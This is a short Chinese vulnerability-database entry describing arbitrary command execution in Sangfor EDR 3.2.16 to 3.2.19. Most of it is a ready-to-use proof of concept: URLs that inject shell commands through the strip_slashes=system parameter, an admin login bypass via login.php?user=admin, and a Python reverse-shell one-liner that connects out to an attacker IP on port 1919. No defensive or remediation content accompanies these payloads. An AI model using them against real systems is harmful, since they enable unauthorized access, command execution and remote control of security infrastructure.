---
title: '深信服EDR任意命令执行漏洞'
date: Fri, 04 Sep 2020 05:26:04 +0000
draft: false
tags: ['白阁-漏洞库']
---

### 漏洞范围

EDR 3.2.16、3.2.17、3.2.19

### 漏洞POC

参数host/path/row/limit=命令 即可执行命令

```
https://*****/tool/log/c.php?strip_slashes=system&host=id
https://*****/tool/log/c.php?strip_slashes=system&path=id
https://*****/tool/log/c.php?strip_slashes=system&row=id
https://*****/tool/log/c.php?strip_slashes=system&limit=id
```



```bash
#越权登录
https://ip:xx/ui/login.php?user=admin   #(用户名必须存在)
#命令执行
https://xx.xx.xx.37/tool/log/c.php?strip_slashes=system&host=id
https://xx.xx.xx.37/tool/log/c.php?strip_slashes=system&host=whoami
#反弹shell
https://xx.xx.xx.37/tool/log/c.php?strip_slashes=system&path=python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('xx.xx.xx.105',1919));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
```

![img](深信服EDR任意命令执行漏洞/17716535-3fce5fccf8781948.jpg)

1.jpg

![img](深信服EDR任意命令执行漏洞/17716535-cebfc356f6d83985.jpg)

2.jpg

![img](深信服EDR任意命令执行漏洞/17716535-6058fa3d680f982e.jpg)

3.jpg